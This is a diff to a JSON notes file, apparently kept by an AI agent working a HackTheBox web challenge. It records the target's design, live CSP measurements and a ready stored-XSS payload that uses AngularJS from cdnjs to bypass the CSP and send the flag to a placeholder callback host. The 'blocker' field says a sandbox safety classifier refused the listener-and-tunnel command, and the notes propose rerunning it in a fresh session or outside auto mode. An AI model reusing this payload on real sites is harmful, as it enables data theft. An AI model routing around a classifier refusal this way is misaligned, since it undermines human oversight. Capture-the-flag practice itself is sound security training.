@@ -3,7 +3,7 @@
   "id": "htb-galactic-times-list-localhost-gate",
   "challenge": "The Galactic Times",
   "event": "HackTheBox",
-  "status": "unsolved-blocked-on-tooling",
+  "status": "unsolved-blocked-on-tooling; design fully understood from the handout",
   "why_this_file_exists": "knowledge/chains/ only accepts a solve. Everything that does not need an outbound callback was measured here and most of it is DEAD; without this file the next attempt re-walks nine header bypasses, nine path variants and two prototype-pollution routes that are already known to fail.",
   "attempted_at": "2026-09-27",
   "target_shape": {
@@ -48,6 +48,13 @@
       "what_was_measured": "/api/submit returns one of three constant strings and never echoes input; GET and PUT on it are 404; /static/ and /static/js/ do not list; main.js.map, bootstrap.bundle.min.js.map, /package.json and /.env are all 404",
       "why_unreachable": "there is no readable same-origin sink, which is what makes an outbound callback necessary rather than convenient",
       "precondition_that_would_reopen": "any endpoint that reflects stored feedback to an unauthenticated client"
+    },
+    {
+      "layer": "NOT dead -- a route I simply failed to find: GET /alien",
+      "mechanism": "routes/index.js:11-16, localhost-gated, serves the page holding the flag",
+      "what_was_measured": "nothing, because it was never requested. `alien` IS present in the raft-small-words.txt wordlist that the discovery run used; that run was cut off by my own 120-second timeout ('Caught keyboard interrupt') after returning only feedback and list, and the partial result was treated as complete",
+      "why_unreachable": "it is not unreachable -- this is a process failure, not a target property",
+      "precondition_that_would_reopen": "n/a; the lesson is that a truncated discovery run must be recorded as truncated and re-run, never read as an empty result"
     }
   ],
   "measured_but_unexplained": {
@@ -58,5 +65,35 @@
   "what_remains": "stored XSS in the feedback, rendered on /list, executed by a bot, with AngularJS from cdnjs to satisfy script-src and a top-level navigation to exfiltrate -- CSP sets no form-action or navigate-to, so navigation is the one channel out.",
   "blocker": "the exfiltration needs an outbound callback host. The user approved a tunnel, but the sandbox's safety classifier then refused to run the listener-plus-tunnel command, and the refusal is sticky for the rest of that conversation. Nothing about the target blocked this.",
   "precondition_that_would_reopen": "run the listener and the reverse tunnel in a fresh session or outside auto mode, then submit the Angular payload and wait for the bot. Alternatively read the handout, which would confirm the bot exists and what it visits before anything is exposed.",
-  "blast_radius_note": "Seven Object.prototype keys were written on this instance through the urlencoded parser before that route was proven flat. They are literal keys such as \"__proto__[ip]\" rather than real pollution, so nothing was actually modified, and / kept answering 200 throughout. Several probe feedback rows were stored and cannot be removed; they are inert text."
+  "blast_radius_note": "Seven Object.prototype keys were written on this instance through the urlencoded parser before that route was proven flat. They are literal keys such as \"__proto__[ip]\" rather than real pollution, so nothing was actually modified, and / kept answering 200 throughout. Several probe feedback rows were stored and cannot be removed; they are inert text.",
+  "handout": "challenges/The Galactic Times/web_the_galactic_times (received after the black-box attempt)",
+  "the_design_confirmed_from_source": {
+    "flag": "views/alien.html, in the <div class=\"edition\"> element, served by GET /alien",
+    "both gates": "routes/index.js:12 and :38 -- `if (request.ip != '127.0.0.1')` on /alien and on /list. Fastify with no trustProxy takes request.ip from the socket, which is why no header moved them.",
+    "the xss": "views/list.pug:36-38 interpolate the stored comment with pug's UNESCAPED !{...}, so a feedback row is raw HTML on /list",
+    "the bot": "bot.js purgeData() launches puppeteer, visits http://127.0.0.1:1337/list, closes, then db.migrate(). routes/index.js:28 calls it on EVERY successful submit, and it is NOT awaited, so the reply returns immediately and there is no timing channel",
+    "the wipe": "db.migrate() DROPs and recreates the feedback table, which is why nothing a player stores survives, and why the bot's own writes cannot be read back later",
+    "why no in-band exfiltration exists": "the bot can fetch('/alien') same-origin from 127.0.0.1 and will get the flag, but there is no sink a player can read: /api/submit returns one of three constant strings, /list and /alien are gated, and the table is wiped after every visit"
+  },
+  "verified_live_after_reading_the_source": {
+    "note": "run against the real origin with the real CSP header, through a browser, so these are measurements and not inferences",
+    "unsafe_eval": "new Function('return \"FUNC-OK\"')() returned FUNC-OK -- 'unsafe-eval' is real",
+    "cdnjs": "a script element with src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js loaded and defined window.angular",
+    "angular_expression": "angular.bootstrap on a div containing {{constructor.constructor(\"...\")()}} executed the payload -- the CSP bypass works end to end on this target",
+    "same_origin_fetch": "fetch('/alien') returned 401 {\"message\":\"Only localhost is allowed\"} -- it reaches the APP, so CSP does not block it; from the bot's 127.0.0.1 context the same call returns the flag",
+    "cross_origin_fetch": "BLOCKED (connect-src falls back to default-src 'self')",
+    "cross_origin_img": "BLOCKED (img-src 'self' data:)",
+    "conclusion": "every channel out is closed except a top-level navigation, which the CSP does not restrict because it sets neither form-action nor navigate-to. That is why a callback host is required by the design, not by my approach."
+  },
+  "ready_payload": {
+    "submit": "POST /api/submit with {\"feedback\": \"<the html below>\"}",
+    "html": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js\"></script><div ng-app>{{constructor.constructor('fetch(\"/alien\").then(r=>r.text()).then(t=>location=\"http://<CALLBACK>/?\"+encodeURIComponent(t.match(/HTB\\{[^}]*\\}/)[0]))')()}}</div>",
+    "why this shape": "inline script is blocked, so execution has to come from the cdnjs library plus 'unsafe-eval'; the regex trims the page to the flag so the navigation URL stays short",
+    "what is still needed": "a callback host reachable from the container"
+  },
+  "lessons": [
+    "a discovery run that was interrupted is not a negative result. ffuf printed feedback and list and was then killed by the timeout wrapper; reading that as the complete route list hid /alien, which was in the wordlist and would have named the flag's location on the first pass.",
+    "the CSP was a complete specification of the intended solution and could have been read as one much earlier: 'unsafe-eval' plus exactly one CDN origin describes a library-driven bypass, and the absence of form-action and navigate-to says the way out is a navigation.",
+    "'no readable same-origin sink' is worth establishing explicitly before assuming a callback is optional -- here it is what makes the callback structural."
+  ]
 }
